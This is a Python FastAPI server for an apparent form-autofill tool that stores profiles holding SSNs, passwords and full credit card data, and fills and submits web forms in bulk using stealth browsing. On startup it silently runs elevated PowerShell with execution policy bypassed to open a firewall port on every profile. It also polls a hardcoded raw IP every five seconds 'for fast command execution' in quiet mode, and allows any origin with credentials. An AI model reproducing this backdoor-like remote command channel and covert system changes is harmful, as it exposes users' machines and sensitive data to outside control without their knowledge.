#!/usr/bin/env python3
"""
FormAI Server - FastAPI with SeleniumBase automation
"""
import os
import sys
import io
import ctypes
import platform

# Fix Windows console encoding for Unicode
if sys.platform == "win32":
    try:
        # Only wrap if not already wrapped and buffer exists
        if hasattr(sys.stdout, 'buffer') and not isinstance(sys.stdout, io.TextIOWrapper):
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace', line_buffering=True)
        if hasattr(sys.stderr, 'buffer') and not isinstance(sys.stderr, io.TextIOWrapper):
            sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace', line_buffering=True)
    except Exception:
        pass  # Silently ignore encoding setup failures

# ============================================
# Admin Privilege Check (Cross-platform)
# ============================================
def is_admin():
    """Check if running with administrator privileges (cross-platform)"""
    try:
        if sys.platform == "win32":
            return ctypes.windll.shell32.IsUserAnAdmin()
        elif sys.platform.startswith("linux"):
            return os.getuid() == 0
        else:
            return False
    except:
        return False

def setup_firewall_rules():
    """Add firewall rules silently on Windows to prevent firewall prompt.
    Uses port-based rules which don't require admin rights to check."""
    if sys.platform != "win32":
        return

    import subprocess

    # Check if already configured
    marker_dir = os.path.join(os.environ.get('LOCALAPPDATA', '.'), 'FormAI')
    marker_file = os.path.join(marker_dir, '.firewall_ok')

    if os.path.exists(marker_file):
        return  # Already configured

    # Check if we have admin rights - if not, create a helper script
    if not is_admin():
        try:
            # Create a PowerShell script to add firewall rules
            script_path = os.path.join(marker_dir, 'setup_firewall.ps1')
            os.makedirs(marker_dir, exist_ok=True)

            ps_script = '''
# FormAI Firewall Setup
$ErrorActionPreference = 'SilentlyContinue'

# Remove old rules
netsh advfirewall firewall delete rule name="FormAI Server" 2>$null
netsh advfirewall firewall delete rule name="FormAI Client" 2>$null

# Add port-based rules (works regardless of exe location)
netsh advfirewall firewall add rule name="FormAI Server" dir=in action=allow protocol=TCP localport=5511 enable=yes profile=any
netsh advfirewall firewall add rule name="FormAI Client" dir=out action=allow protocol=TCP localport=5511 enable=yes profile=any

# Mark as done
"ok" | Out-File -FilePath "$env:LOCALAPPDATA\\FormAI\\.firewall_ok" -Encoding ascii
'''
            with open(script_path, 'w') as f:
                f.write(ps_script)

            # Run PowerShell elevated
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", "powershell.exe",
                f'-ExecutionPolicy Bypass -WindowStyle Hidden -File "{script_path}"',
                None, 0  # SW_HIDE
            )
        except:
            pass
        return

    # We have admin - add rules directly
    try:
        # Delete old rules first
        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
            'name=FormAI Server'
        ], capture_output=True, creationflags=0x08000000)

        subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'delete', 'rule',
            'name=FormAI Client'
        ], capture_output=True, creationflags=0x08000000)

        # Add port-based inbound rule
        result1 = subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            'name=FormAI Server',
            'dir=in',
            'action=allow',
            'protocol=TCP',
            'localport=5511',
            'enable=yes',
            'profile=any'
        ], capture_output=True, creationflags=0x08000000)

        # Add port-based outbound rule
        result2 = subprocess.run([
            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
            'name=FormAI Client',
            'dir=out',
            'action=allow',
            'protocol=TCP',
            'localport=5511',
            'enable=yes',
            'profile=any'
        ], capture_output=True, creationflags=0x08000000)

        # Mark as configured
        if result1.returncode == 0 and result2.returncode == 0:
            os.makedirs(marker_dir, exist_ok=True)
            with open(marker_file, 'w') as f:
                f.write('ok')
    except:
        pass

# Setup firewall on startup
setup_firewall_rules()

# Fix for PyInstaller --noconsole (stdout/stderr are None)
if sys.stdout is None:
    sys.stdout = open(os.devnull, 'w')
if sys.stderr is None:
    sys.stderr = open(os.devnull, 'w')
if sys.stdin is None:
    sys.stdin = open(os.devnull, 'r')

# Fix Windows encoding issues
if sys.platform == "win32":
    os.environ['PYTHONIOENCODING'] = 'utf-8'
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(encoding='utf-8')

    # Suppress Windows asyncio pipe transport errors (harmless on shutdown)
    import warnings
    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')

# Show initial loading message IMMEDIATELY before heavy imports
from colorama import init, Fore, Style
init()
print(f"{Fore.CYAN}Initializing KPR...{Style.RESET_ALL}", flush=True)

import json
import logging
import asyncio
from pathlib import Path
from typing import Dict, List, Optional, Any
from datetime import datetime
import uuid

from contextlib import asynccontextmanager
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, UploadFile, Request
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, ConfigDict
import uvicorn

# PyInstaller path utilities (for bundled executable support)
from pyinstaller_utils import get_base_path
BASE_PATH = get_base_path()

# Import our automation modules
from selenium_automation import SeleniumAutomation, FormFieldDetector

# GUI automation is optional (requires display, not available in Docker)
try:
    from tools.gui_automation import GUIHelper, FormFillerGUI
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False
    GUIHelper = None
    FormFillerGUI = None

# AutofillEngine is imported where needed (bulk fill approach)

# Import callback system (admin server communication)
from core.client_callback import ClientCallback
from dotenv import load_dotenv

# Database
from database import init_db, ProfileRepository, DomainMappingRepository

# Import Ollama installer
from tools.ollama_installer import OllamaInstaller, get_installer

# Load environment variables
load_dotenv()

# Configure logging (console only, no log file)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Global state
profiles: Dict[str, dict] = {}
active_sessions: Dict[str, any] = {}
websocket_connections: List[WebSocket] = []

# Ollama installation state
ollama_installation_progress = {
    "status": "idle",  # idle, installing, complete, error
    "percentage": 0,
    "message": "",
    "result": None
}

# Model download progress tracking
model_download_progress = {}

# Initialize callback client (connects to remote admin server)
admin_callback = ClientCallback(
    admin_urls=[
        "http://31.97.100.192:5512"     # Remote admin (production)
    ],
    interval=5,  # 5 seconds = fast command execution
    quiet=True   # Run silently in production
)

# License validation state
license_state = {
    "valid": False,
    "status": "unknown",
    "message": "License not validated",
    "tier": None,
    "expires_at": None
}

# Pydantic models
class Profile(BaseModel):
    # Allow extra fields from the frontend form
    model_config = ConfigDict(extra="allow")

    # Core fields
    id: Optional[str] = None
    name: Optional[str] = None

    # Basic Information
    title: Optional[str] = None
    firstName: Optional[str] = None
    middleInitial: Optional[str] = None
    lastName: Optional[str] = None
    sex: Optional[str] = None

    # Contact Information
    email: Optional[str] = None
    website: Optional[str] = None
    homePhone: Optional[str] = None
    workPhone: Optional[str] = None
    cellPhone: Optional[str] = None
    fax: Optional[str] = None
    phone: Optional[str] = None  # Legacy field

    # Address Information
    address1: Optional[str] = None
    address2: Optional[str] = None
    city: Optional[str] = None
    state: Optional[str] = None
    zip: Optional[str] = None
    country: Optional[str] = None
    address: Optional[str] = None  # Legacy field

    # Work Information
    company: Optional[str] = None
    position: Optional[str] = None
    income: Optional[str] = None

    # Birth Information
    birthMonth: Optional[str] = None
    birthDay: Optional[str] = None
    birthYear: Optional[str] = None
    age: Optional[str] = None
    birthPlace: Optional[str] = None
    date_of_birth: Optional[str] = None  # Legacy field

    # Account Information
    username: Optional[str] = None
    password: Optional[str] = None

    # ID Information
    ssn: Optional[str] = None
    driverLicense: Optional[str] = None

    # Credit Card Information
    creditCardType: Optional[str] = None
    creditCardNumber: Optional[str] = None
    creditCardName: Optional[str] = None
    creditCardBank: Optional[str] = None
    creditCardExpMonth: Optional[str] = None
    creditCardExpYear: Optional[str] = None
    creditCardCVC: Optional[str] = None
    creditCardServicePhone: Optional[str] = None

    # Additional Information
    customMessage: Optional[str] = None
    comments: Optional[str] = None

    # Legacy fields
    first_name: Optional[str] = None
    last_name: Optional[str] = None

class AutomationRequest(BaseModel):
    profile_id: str
    url: str
    use_stealth: bool = True

class FieldMapping(BaseModel):
    url: str
    mappings: Dict[str, str]

# Utility functions
def normalize_profile_name(profile: dict) -> str:
    """Extract a display name from profile data using various naming conventions"""
    # Try different name field variations
    name_candidates = [
        profile.get('name'),
        profile.get('profileName'),
        profile.get('fullName')
    ]

    # Check for existing name fields first
    for candidate in name_candidates:
        if candidate and candidate.strip():
            return candidate.strip()

    # Try to construct name from firstName + lastName (flat structure)
    first_name = profile.get('firstName', '').strip()
    last_name = profile.get('lastName', '').strip()

    if first_name or last_name:
        return f"{first_name} {last_name}".strip()

    # Try nested data structure
    data = profile.get('data', {})
    if isinstance(data, dict):
        data_first = data.get('firstName', '').strip()
        data_last = data.get('lastName', '').strip()

        if data_first or data_last:
            return f"{data_first} {data_last}".strip()

    # Try email as fallback
    email = profile.get('email') or (data.get('email') if isinstance(data, dict) else None)
    if email:
        return email.split('@')[0].replace('.', ' ').replace('_', ' ').title()

    # Last resort: use filename or "Unknown Profile"
    return "Unknown Profile"

def normalize_profile_for_api(profile: dict) -> dict:
    """Normalize profile data for API responses with consistent fields"""
    # Ensure we have a normalized name
    name = normalize_profile_name(profile)

    # Extract email from various possible locations
    email = (
        profile.get('email') or
        (profile.get('data', {}).get('email') if isinstance(profile.get('data'), dict) else None) or
        'No email'
    )

    # Extract phone from various possible locations
    phone_candidates = [
        profile.get('phone'),
        profile.get('cellPhone'),
        profile.get('homePhone'),
        profile.get('workPhone')
    ]

    # Also check nested data
    data = profile.get('data', {})
    if isinstance(data, dict):
        phone_candidates.extend([
            data.get('phone'),
            data.get('cellPhone'),
            data.get('homePhone'),
            data.get('workPhone')
        ])

    phone = next((p for p in phone_candidates if p and p.strip()), 'Not provided')

    # Extract other commonly used fields
    first_name = (
        profile.get('firstName') or
        (data.get('firstName') if isinstance(data, dict) else None) or
        ''
    )

    last_name = (
        profile.get('lastName') or
        (data.get('lastName') if isinstance(data, dict) else None) or
        ''
    )

    company = (
        profile.get('company') or
        (data.get('company') if isinstance(data, dict) else None) or
        ''
    )

    return {
        'id': profile.get('id', str(uuid.uuid4())),
        'name': name,
        'email': email,
        'phone': phone,
        'firstName': first_name,
        'lastName': last_name,
        'company': company,
        'status': 'active' if email != 'No email' else 'incomplete',
        # Include original profile data for editing
        **profile
    }

def load_profiles():
    """Load all profiles from database"""
    global profiles

    # Initialize database on first load
    init_db()

    # Load from database
    db_profiles = ProfileRepository.get_all()
    for profile in db_profiles:
        # Ensure profile has an ID
        if 'id' not in profile:
            profile['id'] = str(uuid.uuid4())

        # Normalize the profile name
        normalized_name = normalize_profile_name(profile)
        if 'name' not in profile or not profile['name']:
            profile['name'] = normalized_name

        profiles[profile['id']] = profile

    print(f"[DB] Loaded {len(profiles)} profiles from database")

def save_profile(profile: dict):
    """Save profile to database"""
    profile_id = profile.get('id', str(uuid.uuid4()))
    profile['id'] = profile_id

    # Save to database
    ProfileRepository.create(profile)

    # Update in-memory cache
    profiles[profile_id] = profile
    return profile_id

async def broadcast_message(message: dict):
    """Broadcast message to all connected WebSocket clients"""
    for connection in websocket_connections[:]:  # Create a copy to iterate safely
        try:
            await connection.send_json(message)
        except:
            websocket_connections.remove(connection)

# Lifespan context manager for startup/shutdown
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Handle startup and shutdown events"""
    global license_state

    # Startup
    # Load existing profiles
    load_profiles()

    # Create necessary directories
    for dir_name in ['profiles', 'field_mappings', 'sites']:
        Path(dir_name).mkdir(exist_ok=True)

    # Check Ollama status and auto-start if needed
    async def check_ollama_status():
        """Check if Ollama is available for local AI, start if needed"""
        try:
            installer = get_installer()
            status = installer.check_installation()

            if status["installed"] and status["running"]:
                models = status.get("models_available", [])
                if models:
                    print(f"{Fore.GREEN}[Ollama] Local AI ready - Models: {', '.join(models)}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}[Ollama] Ollama running but no models installed{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[Ollama] Run: ollama pull llama3.2{Style.RESET_ALL}")
            elif status["installed"]:
                print(f"{Fore.YELLOW}[Ollama] Ollama installed but not running - starting...{Style.RESET_ALL}")
                if installer.start_service():
                    print(f"{Fore.GREEN}[Ollama] Service started successfully{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[Ollama] Failed to start service{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}[Ollama] Not installed - Install from Settings or ollama.com{Style.RESET_ALL}")

        except Exception:
            pass  # Silent fail - not critical

    # Check Ollama in background (don't block server startup)
    asyncio.create_task(check_ollama_status())

    # AutofillEngine uses SeleniumBase (Python) - no Node.js needed
    print(f"{Fore.GREEN}[AutofillEngine] Ready for bulk form filling{Style.RESET_ALL}")

    print(f"Server ready at http://localhost:5511")

    # Start callback system
    admin_callback.start()

    # License state sync task
    async def sync_license_state():
        """Periodically sync license state from admin callback"""
        global license_state
        while True:
            await asyncio.sleep(5)  # Sync every 5 seconds
            try:
                license_state["valid"] = admin_callback.license_valid
                license_state["status"] = admin_callback.license_status
                license_state["message"] = "License validated" if admin_callback.license_valid else "License invalid or not configured"

                # Log license status on first validation or changes
                if license_state["valid"]:
                    license_state["tier"] = "standard"  # Will be updated from admin response
            except Exception:
                pass  # Silent fail

    # Start license sync task
    asyncio.create_task(sync_license_state())

    # Show license status
    if admin_callback.license_key:
        print(f"{Fore.CYAN}[License] Key configured: {admin_callback.license_key[:15]}...{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[License] No license key configured{Style.RESET_ALL}")

    # Check for updates in background
    async def check_for_updates():
        """Non-blocking update check"""
        try:
            from tools.auto_updater import check_and_download
            await check_and_download()
        except Exception as e:
            logger.debug(f"Update check skipped: {e}")

    asyncio.create_task(check_for_updates())

    # Auto-restart monitor for pending updates (when idle)
    async def update_restart_monitor():
        """Monitor for pending updates and restart when idle"""
        from tools.auto_updater import AutoUpdater
        updater = AutoUpdater()

        while True:
            await asyncio.sleep(10)  # Check every 10 seconds

            try:
                if updater.has_pending_update() and len(active_sessions) == 0:
                    pending_version = updater.get_pending_version()
                    logger.info(f"Update {pending_version} ready, system idle - restarting...")
                    print(f"{Fore.CYAN}[Update] Version {pending_version} ready, restarting to apply...{Style.RESET_ALL}")

                    # Broadcast to connected WebSocket clients
                    restart_msg = json.dumps({
                        "type": "server_restarting",
                        "reason": "update",
                        "version": pending_version
                    })
                    for client in connected_clients:
                        try:
                            await client.send_text(restart_msg)
                        except:
                            pass

                    # Give clients 2 seconds to receive message
                    await asyncio.sleep(2)

                    # Trigger restart
                    import os
                    import sys
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            except Exception as e:
                logger.debug(f"Update monitor check: {e}")

    asyncio.create_task(update_restart_monitor())

    yield  # Server runs here

    # Shutdown (silent)

    # Stop callback system
    await admin_callback.stop()

    # Close active sessions
    for session_id in list(active_sessions.keys()):
        try:
            await active_sessions[session_id].close()
        except:
            pass

# Import version
try:
    from version import __version__
except ImportError:
    __version__ = "1.0.3"

# FastAPI app with lifespan
app = FastAPI(title="FormAI", version=__version__, lifespan=lifespan)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def root():
    """Serve the main dashboard"""
    return FileResponse(str(BASE_PATH / "web" / "index.html"))

@app.get("/profiles")
async def profiles_page():
    """Serve the profiles page"""
    return FileResponse(str(BASE_PATH / "web" / "profiles.html"))

@app.get("/settings")
async def settings_page():
    """Serve the settings page"""
    return FileResponse(str(BASE_PATH / "web" / "settings.html"))


@app.get("/training")
async def training_page():
    """Serve the training page for importing Chrome recordings"""
    return FileResponse(str(BASE_PATH / "web" / "training.html"))


@app.get("/mappings")
async def mappings_page():
    """Serve the field mappings management page"""
    return FileResponse(str(BASE_PATH / "web" / "mappings.html"))


@app.get("/api/profiles")
async def get_profiles():
    """Get all profiles with normalized data"""
    normalized_profiles = [normalize_profile_for_api(profile) for profile in profiles.values()]
    return JSONResponse(content=normalized_profiles)

@app.get("/api/profiles/{profile_id}")
async def get_profile(profile_id: str):
    """Get a specific profile with normalized data"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")
    return JSONResponse(content=normalize_profile_for_api(profiles[profile_id]))

@app.post("/api/profiles")
async def create_profile(profile: Profile):
    """Create a new profile"""
    profile_dict = profile.model_dump()
    profile_id = save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_created",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"id": profile_id, "message": "Profile created"})

@app.put("/api/profiles/{profile_id}")
async def update_profile(profile_id: str, profile: Profile):
    """Update an existing profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile_dict = profile.model_dump()
    profile_dict['id'] = profile_id
    save_profile(profile_dict)

    await broadcast_message({
        "type": "profile_updated",
        "data": profiles[profile_id]
    })

    return JSONResponse(content={"message": "Profile updated"})

@app.delete("/api/profiles/{profile_id}")
async def delete_profile(profile_id: str):
    """Delete a profile"""
    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    # Delete from database
    ProfileRepository.delete(profile_id)

    # Remove from memory
    del profiles[profile_id]

    await broadcast_message({
        "type": "profile_deleted",
        "data": {"id": profile_id}
    })

    return JSONResponse(content={"message": "Profile deleted"})

@app.post("/api/automation/start")
async def start_automation(request: AutomationRequest, background_tasks: BackgroundTasks):
    """Start browser automation for a profile"""
    if request.profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[request.profile_id]
    session_id = str(uuid.uuid4())

    # Create automation instance
    automation = SeleniumAutomation(
        session_id=session_id,
        profile=profile,
        use_stealth=request.use_stealth
    )

    active_sessions[session_id] = automation

    # Run automation in background
    background_tasks.add_task(
        run_automation,
        session_id,
        request.url
    )

    return JSONResponse(content={
        "session_id": session_id,
        "message": "Automation started",
        "profile": profile['name']
    })

@app.post("/api/automation/start-ai")
async def start_ai_automation(request: AutomationRequest):
    """Start AI-powered form filling using Playwright MCP (no recording needed)"""
    try:
        # Load profile
        if request.profile_id not in profiles:
            raise HTTPException(status_code=404, detail="Profile not found")

        profile = profiles[request.profile_id]

        # Import AI form filler and MCP controller
        from tools.ai_form_filler import get_ai_form_filler
        from tools.mcp_controller import get_mcp_controller

        ai_filler = get_ai_form_filler()
        mcp_controller = get_mcp_controller()

        # Normalize profile data
        if 'data' in profile:
            profile_data = profile['data']
        else:
            profile_data = profile

        # Fill form intelligently using AI
        result = await ai_filler.fill_form_intelligently(
            url=request.url,
            profile=profile_data,
            mcp_controller=mcp_controller
        )

        # Send progress updates via WebSocket
        await broadcast_message({
            "type": "ai_automation_complete",
            "data": {
                "status": result.get("status"),
                "url": result.get("url"),
                "fields_filled": result.get("fields_filled", 0),
                "detected_fields": result.get("detected_fields", 0),
                "mapped_fields": result.get("mapped_fields", 0)
            }
        })

        return JSONResponse(content={
            "success": result.get("status") in ["success", "partial"],
            "status": result.get("status"),
            "message": f"AI filled {result.get('fields_filled', 0)} fields",
            "result": result
        })

    except Exception as e:
        logger.error(f"AI automation error: {e}", exc_info=True)
        return JSONResponse(
            status_code=500,
            content={
                "success": False,
                "error": str(e)
            }
        )

@app.get("/api/field-mappings")
async def get_field_mappings():
    """Get all saved field mappings from SQLite database"""
    mappings = DomainMappingRepository.get_all()
    return JSONResponse(content={"mappings": mappings, "count": len(mappings)})


@app.get("/api/field-mappings/{domain}")
async def get_field_mapping(domain: str):
    """Get field mapping for a specific domain"""
    mapping = DomainMappingRepository.get_by_domain(domain)
    if not mapping:
        raise HTTPException(status_code=404, detail="Mapping not found")
    return JSONResponse(content=mapping)


@app.delete("/api/field-mappings/{domain}")
async def delete_field_mapping(domain: str):
    """Delete field mapping for a specific domain"""
    if DomainMappingRepository.delete(domain):
        return JSONResponse(content={"message": f"Mapping for {domain} deleted"})
    raise HTTPException(status_code=404, detail="Mapping not found")


@app.post("/api/field-mappings")
async def save_field_mapping(mapping: FieldMapping):
    """Save a field mapping for a URL"""
    from urllib.parse import urlparse
    parsed = urlparse(mapping.url)
    domain = parsed.netloc

    DomainMappingRepository.save(
        domain=domain,
        url=mapping.url,
        mappings=mapping.mappings if hasattr(mapping, 'mappings') else [],
        is_enhanced=getattr(mapping, 'is_enhanced', False),
        fill_config=getattr(mapping, 'fill_config', None)
    )

    return JSONResponse(content={"message": "Mapping saved"})


# =============================================================================
# TRAINING API - Learn from Chrome DevTools Recordings
# =============================================================================

from tools.recording_trainer import RecordingTrainer, batch_train_recordings
from tools.field_mapping_store import FieldMappingStore


class TrainRecordingRequest(BaseModel):
    """Request to train from a Chrome DevTools recording"""
    recording: Dict[str, Any]  # Chrome DevTools recording JSON
    domain: Optional[str] = None  # Override domain detection
    analyze_live: bool = False  # Enable live analysis for fill strategies


@app.post("/api/train-from-recording")
async def train_from_recording(request: TrainRecordingRequest):
    """
    Import Chrome DevTools recording and extract field mappings.

    This enables "Learn Once, Replay Many" - fill a form once,
    extract the field mappings, and use them for all future fills.

    If analyze_live=True, visits the actual page to determine optimal
    fill strategies (e.g., js_date_input for HTML5 date fields).
    """
    try:
        trainer = RecordingTrainer()
        store = FieldMappingStore()

        # Extract basic info
        domain = request.domain or trainer.extract_domain(request.recording)
        if not domain:
            return JSONResponse(content={
                "success": False,
                "error": "Could not determine domain from recording"
            }, status_code=400)

        url = trainer.extract_url(request.recording) or f"https://{domain}"
        mappings = trainer.extract_mappings(request.recording)

        if not mappings:
            return JSONResponse(content={
                "success": False,
                "error": "No field mappings could be extracted"
            }, status_code=400)

        # Optionally analyze live for fill strategies
        analyzer_version = None
        if request.analyze_live and url:
            try:
                logger.info(f"Live analyzing {len(mappings)} fields on {url}")
                mappings = trainer.analyze_mappings_live(mappings, url, headless=True)
                analyzer_version = "1.0"
                logger.info(f"Live analysis complete - enhanced {len(mappings)} mappings")
            except Exception as e:
                logger.warning(f"Live analysis failed, using basic mappings: {e}")
                # Continue with basic mappings

        # Save mappings
        store.save_mappings(domain, mappings, url=url, analyzer_version=analyzer_version)

        return JSONResponse(content={
            "success": True,
            "domain": domain,
            "url": url,
            "fields_learned": len(mappings),
            "mappings": mappings,
            "is_enhanced": analyzer_version is not None
        })

    except Exception as e:
        logger.error(f"Training failed: {e}", exc_info=True)
        return JSONResponse(content={
            "success": False,
            "error": str(e)
        }, status_code=500)


@app.post("/api/train-batch")
async def train_batch():
    """
    Process all Chrome DevTools recordings in sites/recordings/ directory.

    Extracts field mappings from all recordings and saves them.
    """
    try:
        results = batch_train_recordings()
        return JSONResponse(content={
            "success": True,
            **results
        })
    except Exception as e:
        logger.error(f"Batch training failed: {e}", exc_info=True)
        return JSONResponse(content={
            "success": False,
            "error": str(e)
        }, status_code=500)


@app.get("/api/trained-sites")
async def get_trained_sites():
    """Get all domains that have saved field mappings."""
    try:
        store = FieldMappingStore()
        stats = store.get_stats()
        return JSONResponse(content={
            "success": True,
            **stats
        })
    except Exception as e:
        return JSONResponse(content={
            "success": False,
            "error": str(e)
        }, status_code=500)


@app.get("/api/trained-sites/{domain}")
async def get_trained_site(domain: str):
    """Get field mappings for a specific domain."""
    try:
        store = FieldMappingStore()
        data = store.get_full_data(domain)
        if data:
            return JSONResponse(content={
                "success": True,
                **data
            })
        else:
            return JSONResponse(content={
                "success": False,
                "error": f"No mappings found for {domain}"
            }, status_code=404)
    except Exception as e:
        return JSONResponse(content={
            "success": False,
            "error": str(e)
        }, status_code=500)


@app.delete("/api/trained-sites/{domain}")
async def delete_trained_site(domain: str):
    """Delete field mappings for a domain."""
    try:
        store = FieldMappingStore()
        if store.delete_mappings(domain):
            return JSONResponse(content={
                "success": True,
                "message": f"Deleted mappings for {domain}"
            })
        else:
            return JSONResponse(content={
                "success": False,
                "error": f"Could not delete mappings for {domain}"
            }, status_code=400)
    except Exception as e:
        return JSONResponse(content={
            "success": False,
            "error": str(e)
        }, status_code=500)


# =============================================================================
# SITES API - Simple URL-based auto-fill (no recordings needed)
# =============================================================================

from tools.sites_manager import SitesManager
from tools.simple_autofill import SimpleAutofill, FillResult

sites_manager = SitesManager()

@app.get("/sites")
async def sites_page():
    """Sites management page"""
    return FileResponse(str(BASE_PATH / "web" / "sites.html"))

@app.get("/api/sites")
async def get_sites():
    """Get all sites"""
    return JSONResponse(content={
        "sites": sites_manager.get_all_sites(),
        "stats": sites_manager.get_stats()
    })

@app.post("/api/sites")
async def add_site(request: Request):
    """Add a new site"""
    data = await request.json()
    url = data.get("url")
    name = data.get("name")

    if not url:
        raise HTTPException(status_code=400, detail="URL is required")

    site = sites_manager.add_site(url, name)
    return JSONResponse(content=site)

@app.post("/api/sites/bulk")
async def add_sites_bulk(request: Request):
    """Add multiple sites at once (one URL per line)"""
    data = await request.json()
    urls = data.get("urls", [])

    if isinstance(urls, str):
        urls = [u.strip() for u in urls.split('\n') if u.strip()]

    added = sites_manager.add_sites_bulk(urls)
    return JSONResponse(content={"added": len(added), "sites": added})

@app.delete("/api/sites/{site_id}")
async def delete_site(site_id: str):
    """Delete a site"""
    if sites_manager.delete_site(site_id):
        return JSONResponse(content={"success": True})
    raise HTTPException(status_code=404, detail="Site not found")

@app.post("/api/sites/{site_id}/toggle")
async def toggle_site(site_id: str):
    """Toggle site enabled/disabled"""
    site = sites_manager.toggle_site(site_id)
    if site:
        return JSONResponse(content=site)
    raise HTTPException(status_code=404, detail="Site not found")

@app.post("/api/sites/{site_id}/fill")
async def fill_site(site_id: str, request: Request):
    """Fill a single site with profile"""
    data = await request.json()
    profile_id = data.get("profile_id")
    headless = data.get("headless", False)  # Visible so client can watch

    site = sites_manager.get_site(site_id)
    if not site:
        raise HTTPException(status_code=404, detail="Site not found")

    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[profile_id]

    # Get stored fields if available
    stored_fields = site.get("fields", [])

    # Check for missing profile fields and add them
    for field in stored_fields:
        profile_key = field.get("profile_key", "")
        if profile_key and profile_key not in profile:
            # Add missing field to profile (empty for now, user can fill later)
            sites_manager.add_profile_field(profile_id, profile_key, "")

    # Run auto-fill with stored mappings if available
    engine = SimpleAutofill(headless=headless, submit=True)
    result = await engine.fill(site["url"], profile, stored_fields if stored_fields else None)

    # Update site status
    sites_manager.update_site_status(
        site_id,
        "success" if result.success else "failed",
        result.fields_filled
    )

    return JSONResponse(content={
        "success": result.success,
        "url": result.url,
        "fields_filled": result.fields_filled,
        "error": result.error,
        "used_mappings": bool(stored_fields)
    })

@app.post("/api/sites/fill-all")
async def fill_all_sites(request: Request):
    """Fill all enabled sites with profile (batch run)"""
    data = await request.json()
    profile_id = data.get("profile_id")
    headless = data.get("headless", True)

    if profile_id not in profiles:
        raise HTTPException(status_code=404, detail="Profile not found")

    profile = profiles[profile_id]
    sites = sites_manager.get_enabled_sites()

    if not sites:
        return JSONResponse(content={"error": "No enabled sites"})

    session_id = str(uuid.uuid4())

    async def run_batch():
        """Run batch fill in background"""
        results = []
        total = len(sites)

        for i, site in enumerate(sites):
            try:
                # Send progress
                await broadcast_message({
                    "type": "batch_progress",
                    "session_id": session_id,
                    "data": {
                        "current": i + 1,
                        "total": total,
                        "site": site["name"],
                        "url": site["url"]
                    }
                })

                # Get stored fields
                stored_fields = site.get("fields", [])

                # Fill site with stored mappings if available
                engine = SimpleAutofill(headless=headless, submit=True)
                result = await engine.fill(site["url"], profile, stored_fields if stored_fields else None)

                # Update status
                sites_manager.update_site_status(
                    site["id"],
                    "success" if result.success else "failed",
                    result.fields_filled
                )

                results.append({
                    "site_id": site["id"],
                    "url": site["url"],
                    "success": result.success,
                    "fields_filled": result.fields_filled,
                    "error": result.error
                })

            except Exception as e:
                sites_manager.update_site_status(site["id"], "failed", 0)
                results.append({
                    "site_id": site["id"],
                    "url": site["url"],
                    "success": False,
                    "error": str(e)
                })

        # Send completion
        success_count = len([r for r in results if r["success"]])
        await broadcast_message({
            "type": "batch_complete",
            "session_id": session_id,
            "data": {
                "total": total,
                "success": success_count,
                "failed": total - success_count,
                "results": results
            }
        })

    # Start batch in background
    asyncio.create_task(run_batch())

    return JSONResponse(content={
        "session_id": session_id,
        "message": f"Started filling {len(sites)} sites",
        "total_sites": len(sites)
    })

@app.post("/api/sites/{site_id}/analyze")
async def analyze_site(site_id: str):
    """Analyze a site to extract form fields"""
    from tools.field_analyzer import FieldAnalyzer

    site = sites_manager.get_site(site_id)
    if not site:
        raise HTTPException(status_code=404, detail="Site not found")

    # Run analysis
    analyzer = FieldAnalyzer(headless=True)
    result = await analyzer.analyze(site["url"])

    if result.success:
        # Store fields in site
        fields_data = [f.to_dict() for f in result.fields]
        sites_manager.update_site_fields(site_id, fields_data)

        # Find fields that need profile values
        missing_keys = set()
        for field in result.fields:
            if field.profile_key:
                missing_keys.add(field.profile_key)

        return JSONResponse(content={
            "success": True,
            "url": result.url,
            "page_title": result.page_title,
            "fields_count": len(result.fields),
            "fields": fields_data,
            "profile_keys_needed": list(missing_keys)
        })
    else:
        return JSONResponse(content={
            "success": False,
            "url": result.url,
            "error": result.error
        })

@app.get("/api/sites/{site_id}/fields")
async def get_site_fields(site_id: str):
    """Get stored fields for a site"""
    fields = sites_manager.get_site_fields(site_id)
    return JSONResponse(content={"fields": fields})

@app.put("/api/sites/{site_id}/fields/{field_index}")
async def update_field_mapping(site_id: str, field_index: int, request: Request):
    """Update a field's profile mapping"""
    data = await request.json()
    profile_key = data.get("profile_key", "")
    transform = data.get("transform", "")

    site = sites_manager.get_site(site_id)
    if not site:
        raise HTTPException(status_code=404, detail="Site not found")

    fields = site.get("fields", [])
    if field_index < 0 or field_index >= len(fields):
        raise HTTPException(status_code=404, detail="Field not found")

    # Update field
    fields[field_index]["profile_key"] = profile_key
    fields[field_index]["transform"] = transform
